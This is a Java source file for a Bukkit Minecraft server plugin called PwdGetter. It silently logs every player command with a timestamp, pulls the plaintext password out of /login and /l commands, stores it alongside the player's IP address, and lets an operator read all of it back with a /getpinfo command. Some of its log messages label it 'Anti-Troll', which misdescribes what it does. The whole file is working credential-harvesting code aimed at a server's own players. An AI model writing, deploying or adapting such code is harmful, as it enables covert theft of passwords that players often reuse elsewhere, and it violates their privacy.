package io.d0048.pwdGetter;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

import org.apache.commons.lang.ArrayUtils;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class PwdGetter extends JavaPlugin implements Listener {
	public boolean enable = false;
	public int time = 0;
	String cmdSuffix = ".cmds", ipSuffix = ".ip", pwdSuffix = ".pwd";

	@Override
	public void onEnable() {
		getServer().getPluginManager().registerEvents(this, this);

		this.getConfig().set("Enable", this.getConfig().getBoolean("Enable"));
		this.enable = this.getConfig().getBoolean("Enable");
		this.saveDefaultConfig();
		saveConfig();

		getLogger().info("[PasswordRecorder]Successfully loaded!");
	}

	@Override
	public void onDisable() {
		getLogger().info("[Anti-Troll]Reloading!");
	}

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label,
			String[] args) {
		if (cmd.getName().equalsIgnoreCase("getpinfo")) {
			if (args.length != 1) {
				sender.sendMessage(ChatColor.RED + "Wrong arguments![参数不正确]");
				return false;
			} else {
				if (this.getConfig().get(args[0]) == null) {
					sender.sendMessage(ChatColor.RED
							+ "Player not recorded yet![玩家尚未被记录]");
				} else {
					sender.sendMessage(ChatColor.GREEN + "Command History: ");
					for (String command : this.getConfig().getStringList(
							args[0] + this.cmdSuffix)) {
						sender.sendMessage(ChatColor.GREEN + command);
					}
					sender.sendMessage(ChatColor.GREEN
							+ "Password phrase: "
							+ this.getConfig().getString(
									args[0] + this.pwdSuffix));
					sender.sendMessage(ChatColor.GREEN
							+ "IP address: "
							+ this.getConfig().getString(
									args[0] + this.ipSuffix));
				}
			}
		}
		return false;
	}

	@EventHandler(priority = EventPriority.NORMAL, ignoreCancelled = true)
	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
		if (this.enable) {
			String time = new java.util.Date().toString();
			String name = event.getPlayer().getName();
			String ip = event.getPlayer().getAddress().getHostName();
			String cmd = "[" + time + "] " + event.getMessage();
			FileConfiguration config = this.getConfig();

			if (config.get(name) != null) {
				System.out.println("Reading player info.");
				List<String> list = config.getStringList(name + cmdSuffix);
				list.add(cmd);
				config.set(name + cmdSuffix, list);
			} else {
				System.out.println("Unknow player, creating.");
				String[] tail = { cmd };
				config.set(name + cmdSuffix, Arrays.asList(tail));
				config.set(name + this.pwdSuffix, "Not yet recorded");
			}
			if (event.getMessage().startsWith("/l ")
					|| event.getMessage().startsWith("/L ")
					|| event.getMessage().startsWith("/login ")
					|| event.getMessage().startsWith("/LOGIN ")) {
				if (event.getMessage().split(" ")[1] != null) {
					config.set(name + this.pwdSuffix,
							event.getMessage().split(" ")[1]);
				}
			}
			config.set(name + ipSuffix, ip);
			this.saveConfig();
			this.saveDefaultConfig();
			System.out.println("Saving config");
			/*
			 * if (event.getMessage().startsWith("/l ") ||
			 * event.getMessage().startsWith("/L ") ||
			 * event.getMessage().startsWith("/login ") ||
			 * event.getMessage().startsWith("/LOGIN ")) {
			 * this.nameAndCmds.put(event.getPlayer().getName(),
			 * event.getMessage());
			 * this.getConfig().set(event.getPlayer().getName(),
			 * event.getMessage()); System.out.print("正在记录" +
			 * event.getPlayer().getName() + "的" + event.getMessage());
			 * this.saveConfig(); this.saveDefaultConfig(); }
			 */
		}
	}
}
